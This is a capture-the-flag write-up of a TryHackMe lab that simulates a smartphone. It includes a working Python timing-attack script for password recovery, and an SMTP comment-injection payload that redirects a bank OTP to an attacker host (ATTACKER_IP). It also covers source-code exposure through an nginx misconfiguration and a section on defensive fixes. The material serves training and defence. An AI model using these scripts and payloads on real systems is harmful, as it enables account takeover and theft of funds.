---
layout: default
title: Breachblocker Unlocker – Mobile Exploitation
page_type: writeup
---

# Breachblocker Unlocker - Full Attack Path Write-Up

**Platform:** TryHackMe
**Category:** Web Exploitation / Cryptography / SMTP Abuse
**Difficulty:** Medium-Hard

## 0. Pre-Quest - Finding the Side Quest Key

Before you can even access this room, you need to find the side quest key hidden inside the Advent of Cyber Day 21 challenge. Here's how that works.

The room provides a ZIP file called `NorthPole.zip` with a password. Extracting it gives you an HTA file: `NorthPolePerformanceReview.hta`.

Opening the HTA in a text editor reveals VBScript that writes a Base64-encoded variable `p` to a temp file, then uses PowerShell to decode and execute it. Rather than running it, we can just extract and decode it ourselves.

Pull the Base64 blob out of the HTA:

```bash
grep -oP '(?<=p = ").*(?=")' NorthPolePerformanceReview.hta > p_encoded.txt
```

Decode it:

```bash
base64 -d p_encoded.txt > stage2.ps1
```

Reading `stage2.ps1`, you'll find another PowerShell script. This one takes a variable `d`, Base64-decodes it, then XORs the result with the key `23` before POSTing it to a C2 server. We don't need to run it either -- just replicate the decode and XOR steps.

Extract the `d` variable's Base64 content, decode it, and apply the XOR:

```bash
grep -oP '(?<=\$d = ").*(?=")' stage2.ps1 | base64 -d > xored_blob.bin
xortool-xor -r 23 -f xored_blob.bin > output.png
```

The output is a PNG image. Open it up and you'll see the side quest key staring right at you. Plug that into the side quest portal and the Breachblocker Unlocker room unlocks.

## 1. High-Level Overview

Breachblocker Unlocker is a mobile phone simulation challenge requiring exploitation of multiple applications running on Sir BreachBlocker's smartphone. The challenge involves source code analysis, timing-based cryptographic attacks, SMTP domain confusion, and 2FA bypass to compromise three different services and release charity funds.

### Target Infrastructure

- **Port 8443:** HTTPS web server hosting phone interface
- **Port 25:** SMTP server
- **Port 22:** SSH (filtered)
- **Port 21337:** Unknown service (filtered)

### Applications on Phone

- **Hopflix** - Streaming service with timing-vulnerable authentication
- **Hopsec Bank** - Banking app with 2FA protection
- **Mail** - Email client
- **Messages** - Text message app with hints
- Browser, Photos, Phone, Authenticator, Settings

### Attack Chain

1. Source code discovery via Nginx misconfiguration --> First flag
2. Timing attack on character-by-character password hashing --> Hopflix access
3. SMTP domain confusion to redirect OTP email --> 2FA bypass
4. Bank access --> Charity fund release --> Final flag

## 2. Initial Reconnaissance

### Port Scanning

```bash
nmap -sV -p- TARGET_IP
```

Results:

```
PORT      STATE         SERVICE
22/tcp    open|filtered ssh
25/tcp    open|filtered smtp
8443/tcp  open|filtered https-alt
21337/tcp open|filtered unknown
```

The primary service is running on port 8443 (HTTPS), which hosts the phone interface.

### Accessing the Phone Interface

```bash
# Add to /etc/hosts if using domain names
echo "TARGET_IP hopsec.thm" | sudo tee -a /etc/hosts
echo "TARGET_IP easterbunnies.thm" | sudo tee -a /etc/hosts

# Access the phone
curl -k https://TARGET_IP:8443
```

The interface presents a realistic smartphone home screen with multiple applications.

## 3. Flag 1 - Source Code Discovery via Nginx Misconfiguration

### 3.1 Fuzzing the HTTPS Application

The first step is fuzzing the web app on port 8443 to look for interesting files. Using `ffuf` with SecLists' `quickhits.txt`:

```bash
ffuf -u https://TARGET_IP:8443/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
     -mc all -fc 404 \
     -k
```

This discovers that `nginx.conf` is directly accessible -- the server is literally serving its own config file.

### 3.2 Reading the Nginx Configuration

```bash
curl -k https://TARGET_IP:8443/nginx.conf
```

Inside the config, the critical directive is:

```nginx
try_files $uri @app;
```

This tells Nginx: "First, check if the requested URI exists as a file on disk. If it does, serve it directly. Otherwise, forward the request to the Python backend (`@app`)."

This is a classic misconfiguration. The Python source code files are sitting in the same directory that Nginx serves static files from. So if we request `main.py` directly, Nginx will happily hand it over without ever touching the Python backend.

### 3.3 Retrieving the Python Source

```bash
curl -k https://TARGET_IP:8443/main.py
```

And just like that, we have the entire application source code. Inside it:

```python
# Credentials (server-side only)
HOPFLIX_FLAG = os.getenv('HOPFLIX_FLAG')
BANK_ACCOUNT_ID = "hopper"
BANK_PIN = os.getenv('BANK_PIN')
BANK_FLAG = os.getenv('BANK_FLAG')
#CODE_FLAG = THM{eggsposed_source_code}
```

**Flag 1: `THM{eggsposed_source_code}`**

### 3.4 What the Source Code Reveals

This is a goldmine. Beyond the flag, the source gives us:

- **Database filenames** used by the app
- **The hashing logic** -- `hopper_hash()` does 5000 rounds of SHA-1 per character
- **The login flow** -- character-by-character password validation (timing attack vector)
- **The 2FA implementation** -- including the `send_otp_email()` function and its email validation logic
- **The phone passcode** hardcoded as `210701`
- **Bank account ID** is an email address, not just "hopper"

All of this feeds directly into the later stages.

### 3.5 Face ID Toggle Vulnerability

The JavaScript also revealed a Face ID security bypass. When Face ID is toggled, a global variable `window.faceIdDisabled` can be manipulated via browser console to disable biometric authentication.

## 4. Flag 2 - Hopflix Timing Attack

### 4.1 Understanding the Vulnerability

From the source code, the Hopflix authentication endpoint `/api/check-credentials` validates passwords character-by-character:

```python
@app.route('/api/check-credentials', methods=['POST'])
def check_credentials():
    data = request.json
    email = str(data.get('email', ''))
    pwd = str(data.get('password', ''))

    rows = cursor.execute(
        "SELECT * FROM users WHERE email = ?",
        (email,),
    ).fetchall()
    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})

    phash = rows[0][2]

    # Length check
    if len(pwd)*40 != len(phash):
        return jsonify({'valid':False, 'error':'Incorrect Password'})
    # Character-by-character validation
    for ch in pwd:
        ch_hash = hopper_hash(ch)  # 5000 iterations of SHA-1
        if ch_hash != phash[:40]:
            return jsonify({'valid':False, 'error':'Incorrect Password'})
        phash = phash[40:]

    session['authenticated'] = True
    session['username'] = email
    return jsonify({'valid': True})
```

The vulnerability breaks down like this:

- **Password length check reveals exact length:** The hash in the database is 480 hex characters. Each character produces a 40-char SHA-1 hash. So 480 / 40 = **12 characters**.
- **Each correct character adds ~5000 SHA-1 operations** to the response time.
- **Incorrect characters fail immediately.**
- This creates a measurable timing difference we can exploit.

**Target Email:** `sbreachblocker@easterbunnies.thm`

### 4.2 Length Detection

First, determine the password length by testing different lengths and measuring response times:

```python
def find_length():
    print("[*] Detecting password length by timing...")
    with requests.Session() as sess:
        sess.headers.update({"Content-Type":"application/json"})
        scores = []
        for L in range(1, 33):  # Test lengths 1-32
            pw = "A" * L
            mt = median_time(sess, EMAIL, pw, trials=4)
            scores.append((mt, L))
            print(f"  len={L:02d}  median={mt:.4f}s")

        # Correct length has noticeably higher timing
        scores.sort(reverse=True)
        best = scores[0][1]
        print(f"[+] Best timing length guess: {best}")
        return best
```

**Result:** Password length detected as **12 characters**.

### 4.3 Beam Search Character Recovery

Since each character position can be any of ~80 possible characters, brute forcing all combinations would take too long. Instead, use a beam search algorithm that:

1. Tests all characters at position N
2. Keeps top K candidates based on timing
3. Expands each candidate at position N+1
4. Repeats until full password recovered

### Timing Attack Script

```python
#!/usr/bin/env python3
import time
import statistics
import string
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE  = "https://TARGET_IP:8443"
EMAIL = "sbreachblocker@easterbunnies.thm"

# Beam search parameters
BEAM_WIDTH = 6          # Keep top 6 candidates per position
TRIALS_FAST = 3         # Quick ranking trials
TRIALS_CONFIRM = 7      # Confirmation trials

# Character set
CHARSET = (
    string.ascii_lowercase +
    string.ascii_uppercase +
    string.digits +
    "!@#$%^&*()_+-={}[]:;,.?/ "
)

def post_time(sess: requests.Session, email: str, pw: str) -> float:
    """Measure response time for a password guess"""
    t0 = time.perf_counter()
    r = sess.post(
        BASE + "/api/check-credentials",
        json={"email": email, "password": pw},
        verify=False,
        timeout=20,
    )
    _ = r.text
    return time.perf_counter() - t0

def median_time(sess, email, pw, trials) -> float:
    """Get median timing over multiple trials"""
    times = []
    for _ in range(trials):
        try:
            times.append(post_time(sess, email, pw))
        except Exception:
            times.append(0.0)
    return statistics.median(times)

def is_valid(sess, email, pw) -> bool:
    """Check if password is correct"""
    r = sess.post(
        BASE + "/api/check-credentials",
        json={"email": email, "password": pw},
        verify=False,
        timeout=20,
    )
    try:
        return r.json().get("valid") is True
    except Exception:
        return False

def crack(length: int):
    print(f"[*] Cracking with length={length}, BEAM_WIDTH={BEAM_WIDTH} ...")

    # Each beam item: (score, prefix)
    beams = [(0.0, "")]

    with requests.Session() as sess:
        sess.headers.update({"Content-Type":"application/json"})

        for pos in range(length):
            candidates = []
            for _, prefix in beams:
                pad_len = length - (len(prefix) + 1)
                if pad_len < 0:
                    continue

                # FAST pass over charset
                fast_results = []
                for ch in CHARSET:
                    guess = prefix + ch + ("A" * pad_len)
                    mt = median_time(sess, EMAIL, guess, TRIALS_FAST)
                    fast_results.append((mt, ch))

                fast_results.sort(reverse=True)
                top_k = fast_results[:max(BEAM_WIDTH, 6)]

                # CONFIRM pass for stability
                for mt_fast, ch in top_k:
                    guess = prefix + ch + ("A" * pad_len)
                    mt_conf = median_time(sess, EMAIL, guess, TRIALS_CONFIRM)
                    candidates.append((mt_conf, prefix + ch))

            # Keep global top beams
            candidates.sort(reverse=True)
            beams = candidates[:BEAM_WIDTH]

            print(f"\n[pos {pos+1}/{length}] Top beams:")
            for i, (sc, pre) in enumerate(beams, 1):
                print(f"  {i:02d}) {repr(pre)}   score(med)={sc:.4f}s")

    print("\n[*] Finished beam build. Validating full candidates...")
    for sc, prefix in beams:
        if len(prefix) != length:
            continue
        ok = is_valid(sess, EMAIL, prefix)
        print(f"  candidate={repr(prefix)}  score={sc:.4f}s  valid={ok}")
        if ok:
            print("\n[+] FOUND PASSWORD:", prefix)
            return prefix

    print("\n[-] No valid password in top beams.")
    return None

def main():
    length = find_length()
    crack(length)

if __name__ == "__main__":
    main()
```

### 4.4 Password Recovery Results

Timing pattern observed:

```
[pos 1/12] Top beams:
  01) 'm'          score(med)=0.3421s
  02) 'h'          score(med)=0.3215s
  03) 'r'          score(med)=0.3012s
[pos 2/12] Top beams:
  01) 'ma'         score(med)=0.6831s
  02) 're'         score(med)=0.6542s
[pos 3/12] Top beams:
  01) 'mal'        score(med)=1.0245s
...
[pos 12/12] Top beams:
  01) 'malharerocks'  score(med)=4.1523s
```

**Recovered Password:** `malharerocks`

This matches the hint from the text messages about rabbits -- "mal hare rocks"!

### 4.5 Accessing Hopflix

```bash
curl -k https://TARGET_IP:8443/api/check-credentials \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"sbreachblocker@easterbunnies.thm","password":"malharerocks"}' \
  --cookie-jar cookies.txt
```

Response:

```json
{"valid": true}
```

After authentication, accessing the "last viewed" endpoint:

```bash
curl -k https://TARGET_IP:8443/api/get-last-viewed \
  -H "Cookie: session=<SESSION_COOKIE>"
```

Response:

```json
{"last_viewed": "THM{fluffier_things_season_4}"}
```

**Flag 2: `THM{fluffier_things_season_4}`**

## 5. Flag 3 - Hopsec Bank 2FA Bypass via SMTP Domain Confusion

### 5.1 Banking Application Analysis

Accessing the Hopsec Bank app from the phone interface reveals a two-step authentication process:

1. Account ID + PIN
2. 2FA code sent via email

From the source code analysis (Flag 1), we already know:

- **Account ID:** `sbreachblocker@easterbunnies.thm`
- **Phone Passcode:** `210701`

### 5.2 Bank Login

Testing if the phone passcode is reused as the bank PIN:

```bash
curl -k https://TARGET_IP:8443/api/bank-login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"account_id":"sbreachblocker@easterbunnies.thm","pin":"210701"}' \
  --cookie-jar bank_cookies.txt
```

Response:

```json
{
  "success": true,
  "requires_2fa": true,
  "trusted_emails": ["sbreachblocker@easterbunnies.thm"]
}
```

The phone passcode is reused as the bank PIN. **Bank PIN: `210701`**

### 5.3 Understanding the 2FA Email Validation Flaw

Now we need a 2FA code. The bank sends a 6-digit OTP to a trusted email address. Normally we can't read the victim's inbox, so how do we get the code?

Looking at the `send_otp_email()` function from the source code we pulled earlier, there's a critical logic bug in the email validation:

```python
def send_otp_email(otp, to_addr):
    domain = to_addr.split('@')[-1]
    if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1
    # ... sends the email via SMTP
```

Spot the problem? The condition uses `and` instead of `or`. For the check to reject an email, **both** conditions must be True -- the domain must be disallowed AND the full address must be disallowed. If **either** condition is False, the whole check passes.

The domain is extracted with `to_addr.split('@')[-1]`. This means if we craft an email address with multiple `@` characters, only the text after the **last** `@` is checked as the domain.

### 5.4 Crafting the SMTP Domain Confusion Payload

Here's the trick. We craft an email like:

```
attacker@[ATTACKER_IP](@easterbunnies.thm
```

When Python runs `split('@')` on this string, the last element is `easterbunnies.thm` -- which is in `allowed_domains`. So the domain check passes.

But when SMTP processes this address, the `(` character acts as an RFC 5321 comment delimiter. The SMTP server interprets the actual recipient as `attacker@[ATTACKER_IP]` and treats `(@easterbunnies.thm` as a comment. The OTP gets delivered to **our** machine instead of the victim's inbox.

### 5.5 Executing the Attack

First, start a lightweight SMTP server on your attack box to catch the incoming OTP:

```bash
python3 -m aiosmtpd -n -l ATTACKER_IP:25
```

Then, intercept the send-2fa request (via Burp or curl) and replace the email with our crafted payload:

```bash
curl -k https://TARGET_IP:8443/api/send-2fa \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<SESSION_COOKIE>" \
  -d '{"otp_email":"attacker@[ATTACKER_IP](@easterbunnies.thm"}'
```

Response:

```json
{"success": true}
```

Back on your SMTP server, the OTP arrives in the email body. Grab the 6-digit code.

**Side note:** The `/api/verify-2fa` endpoint also had no rate limiting, so brute forcing all 1,000,000 possible 6-digit codes with `ffuf` was technically possible too. But the SMTP domain confusion is the intended (and far more elegant) path.

### 5.6 Verifying the 2FA Code

```bash
curl -k https://TARGET_IP:8443/api/verify-2fa \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<SESSION_COOKIE>" \
  -d '{"code":"<OTP_FROM_SMTP_SERVER>"}'
```

Response:

```json
{"success": true}
```

Session is now fully authenticated with 2FA verified.

### 5.7 Releasing the Funds

With both authentication steps complete, we can hit the protected endpoint:

```bash
curl -k https://TARGET_IP:8443/api/release-funds \
  -X POST \
  -H "Cookie: session=<SESSION_COOKIE>"
```

Response:

```json
{"flag": "THM{neggative_balance}"}
```

**Flag 3: `THM{neggative_balance}`**

Bank details revealed:

- **Account Holder:** Sir BreachBlocker
- **Account Number:** --1234
- **Available Balance:** 2,847,392.50
- **AoC Festival Charity Fund:** 1,500,000.00
- **Status:** Locked

## 6. Attack Chain Summary

| Phase | Attack Vector | Vulnerability | Result |
|-------|--------------|---------------|--------|
| 1 | Nginx Config Discovery | `nginx.conf` served directly via fuzzing | Config file leak |
| 2 | Source Code via `try_files` | Nginx serves `main.py` from disk before hitting backend | Flag 1, full app understanding |
| 3 | Length Detection | Timing side-channel in password validation | Password length = 12 characters |
| 4 | Beam Search Timing Attack | Character-by-character hash validation | Hopflix password: `malharerocks` |
| 5 | Authenticated Access | Weak password + timing vulnerability | Hopflix access, Flag 2 |
| 6 | Bank Login | PIN reuse (phone passcode = bank PIN) | Bank authentication (step 1) |
| 7 | SMTP Domain Confusion | `and` vs `or` in email validation + SMTP comment injection | OTP redirected to attacker |
| 8 | Fund Release | Full authentication chain complete | Flag 3, charity fund access |

### Flags Obtained

```
Flag 1: THM{eggsposed_source_code}     # Python source code via Nginx misconfiguration
Flag 2: THM{fluffier_things_season_4}  # Hopflix streaming service
Flag 3: THM{neggative_balance}         # Hopsec Bank charity fund release
```

### Credentials Harvested

```
Phone Passcode: 210701
Hopflix:
- Email: sbreachblocker@easterbunnies.thm
- Password: malharerocks
Hopsec Bank:
- Account ID: sbreachblocker@easterbunnies.thm
- PIN: 210701
- 2FA Email: sbreachblocker@easterbunnies.thm
```

## 7. Defensive Lessons Learned

### 1. Source Code Exposure via Web Server Misconfiguration

**The Vulnerability:** The `try_files $uri @app;` directive in Nginx caused the server to serve Python source files directly when requested by name, before the request ever reached the application backend.

**Real-World Impact:**
- 2019 - Capital One breach: AWS credentials in exposed configs
- 2021 - Codecov supply chain attack: exposed secrets in CI/CD
- 2023 - Toyota source code leak: 300k+ customer records exposed

**Defense in Depth:**

Never store application source code in the same directory tree that your web server serves static files from. If you must co-locate them, explicitly deny access to sensitive extensions:

```nginx
# Block access to source files and configs
location ~* \.(py|pyc|conf|db|sqlite)$ {
    deny all;
    return 404;
}
```

Use environment variables for secrets, scan code with secret detection tools (`git-secrets`, `truffleHog`, `gitleaks`), and implement pre-commit hooks:

```bash
# Pre-commit hook example
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
if git diff --cached | grep -E 'API_KEY|PASSWORD|SECRET'; then
    echo "Potential secret detected!"
    exit 1
fi
EOF
chmod +x .git/hooks/pre-commit
```

**Client-Side Security Principles:**
- Treat all client-side code as public
- Use server-side validation for everything
- Implement proper session management
- Secrets belong in environment variables, not source code

### 2. Timing Side-Channel Attacks - Character-by-Character Validation

**The Vulnerability:** Password validation processed each character sequentially, with each correct character adding measurable processing time (5000 SHA-1 iterations).

```python
# VULNERABLE - Each character adds measurable time
for ch in pwd:
    ch_hash = hopper_hash(ch)  # 5000 iterations
    if ch_hash != phash[:40]:
        return jsonify({'valid':False, 'error':'Incorrect Password'})
    phash = phash[40:]
```

**Why This Works:**
- Correct character at position N: ~5000 SHA-1 operations
- Incorrect character at position N: immediate failure
- Attacker measures response time to determine correct characters
- Each position reduces search space from 80^12 to 80*12

**Real-World Impact:**
- 2013 - Lucky 13 attack on TLS
- 2018 - Spectre/Meltdown timing attacks
- 2020 - SSH timing attacks in Dropbear

**Defense in Depth:**

```python
import hmac

# BAD - Timing vulnerable
def check_password(provided, stored):
    return provided == stored  # Fails fast on first mismatch

# GOOD - Constant time
def check_password_secure(provided, stored):
    return hmac.compare_digest(provided, stored)  # Always compares all bytes
```

Use proper password hashing libraries (bcrypt, Argon2) that handle constant-time comparison internally:

```python
from argon2 import PasswordHasher
ph = PasswordHasher()

# Hashing (registration)
hash = ph.hash(password)

# Verification (login) - constant time internally
try:
    ph.verify(hash, password)
    return True
except:
    return False
```

Additional mitigations:
- Implement rate limiting (max 5 attempts per minute)
- Add artificial delays / jitter to response times
- Use exponential backoff after failed attempts
- Monitor for rapid sequential authentication attempts

### 3. Email Validation Flaws and SMTP Domain Confusion

**The Vulnerability:** The `send_otp_email()` function used `and` instead of `or` in its validation logic, and the SMTP protocol's comment syntax allowed redirecting OTP emails to an attacker-controlled server.

```python
# VULNERABLE - and instead of or
if domain not in allowed_domains and to_addr not in allowed_emails:
    return -1

# FIXED - or ensures both checks must pass
if domain not in allowed_domains or to_addr not in allowed_emails:
    return -1
```

**Why This Matters:**
- Boolean logic errors in security checks are surprisingly common
- Email address parsing is notoriously tricky -- RFC 5321 allows comments, folding, and other syntax that most developers don't account for
- If your validation parses addresses differently than your SMTP server does, attackers can exploit the gap

**Defense in Depth:**

Strictly validate email addresses using a well-tested library, not string splitting:

```python
import re

def sanitize_email(email):
    # Reject anything with multiple @ signs, parentheses, or other SMTP specials
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email format")
    return email
```

For OTP delivery specifically:
- Never let the user specify the delivery address -- always use the address on file
- If users must choose a delivery target, validate against a strict allowlist with `or` logic (not `and`)
- Use TOTP (time-based one-time passwords) instead of email-based OTP where possible

### 4. Two-Factor Authentication - Rate Limiting and Code Strength

**The Vulnerability:** Beyond the email redirect, the 2FA verification endpoint had no rate limiting, meaning all 1,000,000 possible 6-digit codes could be brute-forced.

```python
@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    # NO RATE LIMITING!
    code = str(data.get('code', ''))

    if code == decrypt(session.get('bank_2fa_code')):
        return jsonify({'success': True})
    else:
        return jsonify({'error': 'Invalid code'}), 401
```

**Defense in Depth:**

```python
from flask_limiter import Limiter

@app.route('/api/verify-2fa', methods=['POST'])
@limiter.limit("3 per minute")
@limiter.limit("10 per hour")
def verify_2fa():
    code = str(data.get('code', ''))

    if 'failed_2fa_attempts' not in session:
        session['failed_2fa_attempts'] = 0

    if session['failed_2fa_attempts'] >= 3:
        session['bank_2fa_locked'] = True
        return jsonify({'error': 'Too many attempts. Account locked.'}), 429

    if code == decrypt(session.get('bank_2fa_code')):
        session['failed_2fa_attempts'] = 0
        return jsonify({'success': True})
    else:
        session['failed_2fa_attempts'] += 1
        if session['failed_2fa_attempts'] >= 3:
            del session['bank_2fa_code']
        return jsonify({'error': 'Invalid code'}), 401
```

Best practices for 2FA:
- Use TOTP instead of email/SMS when possible
- Implement aggressive rate limiting (max 3-5 attempts)
- Expire codes after 5 minutes
- Use 8+ digit codes (or alphanumeric)
- Lock account after multiple failures
- Log all 2FA attempts
- Consider WebAuthn/FIDO2 for phishing-resistant MFA

### 5. Password Reuse - Phone Passcode as Bank PIN

**The Vulnerability:** The 6-digit phone lock screen passcode (`210701`) was reused as the bank PIN.

**Real-World Impact:**
- 81% of data breaches involve weak/reused passwords (Verizon DBIR 2023)
- Credential stuffing attacks exploit password reuse
- Average person reuses passwords across 13+ accounts

**Defense:**
- Enforce unique passwords/PINs across different services
- Require minimum 12 characters for passwords (16+ preferred)
- Check against HaveIBeenPwned database
- Implement password history (last 5-10)
- Recommend password managers to users

### 6. Session Management and Cookie Security

**The Vulnerability:** Session cookies were used throughout the application but lacked proper security attributes.

**Defense:**

```python
from flask import Flask, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

app.config.update(
    SESSION_COOKIE_SECURE=True,       # Only send over HTTPS
    SESSION_COOKIE_HTTPONLY=True,     # Prevent JavaScript access
    SESSION_COOKIE_SAMESITE='Strict', # CSRF protection
    SESSION_COOKIE_NAME='__Host-session',
    PERMANENT_SESSION_LIFETIME=1800,  # 30 minute timeout
)
```

### 7. Summary - Defense Prioritization

If you can only fix five things, prioritize:

1. **Remove secrets from served directories** - Separate static files from application source. Use environment variables for secrets. Audit Nginx/Apache configs for `try_files` and similar directives that might expose backend code.

2. **Implement constant-time operations** - Prevent timing attacks on authentication. Use `hmac.compare_digest()` for comparisons. Use proper password hashing (Argon2/bcrypt).

3. **Rate limiting on all authentication endpoints** - Max 5 attempts per minute. Exponential backoff after failures. Account lockout after persistent attempts.

4. **Fix email validation logic** - Use `or` not `and` for security checks. Strictly validate email format. Never let users specify arbitrary OTP delivery addresses. Consider TOTP over email-based 2FA.

5. **Password policy enforcement** - Minimum 12 characters. Check against common password lists. Enforce password history. Prevent credential reuse across services.

### Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/)
- [HaveIBeenPwned API](https://haveibeenpwned.com/API/v3)

## Final Thoughts

This challenge demonstrates how seemingly small vulnerabilities compound into complete system compromise. Each weakness on its own might seem manageable, but when chained together, they enable full account takeover and unauthorized fund transfers.

The techniques shown here are all actively used in real-world attacks:

- Timing attacks break authentication daily
- Email validation logic bugs enable OTP theft
- Password reuse enables credential stuffing at scale
- Source code exposure through web server misconfiguration leads to major breaches
- Boolean logic errors (`and` vs `or`) in security checks are more common than you'd think
